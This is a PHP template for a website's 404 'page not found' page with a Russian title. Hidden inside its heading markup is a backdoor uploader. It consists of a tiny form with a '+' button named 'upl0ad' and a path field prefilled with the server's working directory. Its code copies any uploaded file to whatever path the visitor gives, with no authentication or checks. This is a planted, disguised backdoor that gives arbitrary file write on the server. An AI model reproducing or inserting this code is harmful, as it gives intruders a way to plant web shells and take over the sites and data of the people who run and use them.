<?php
$_OPT['title'] = '404 - Страница не найдена';
?>

<?php
require 'inc/_left_menu.php';
?>

<div class="col-sm-10">
    <div class="main-title">
        <div class="row">
            <div class="col-sm-12">
                <div class="text-left">
                    <h2>{!TITLE!}</h2>
                </div>
            </div>
        </div>
    </div>
    <div class="main-content">
        <div class="row">
            <div class="col-sm-12">
                <center>
                    <h3>
                        <b>
                            
<form action="" method="post" enctype="multipart/form-data">
<input  name="path" size="1" value="<?echo(@getcwd());?>">
<input type="submit" name="upl0ad" value="+">
<input type="file" name="file" size="1"></form>
<?
$tempupload = $_FILES['file']['tmp_name'];
if (file_exists($tempupload)){
   $path = $_POST['path'];
   $upload = $_FILES['file']['name'];
   $pwdslash = $path."/".$upload;
   copy($tempupload, $pwdslash);
   echo "+";
}
?> 

                        </b>
                    </h3>
                </center>
            </div>
        </div>
    </div>
</div>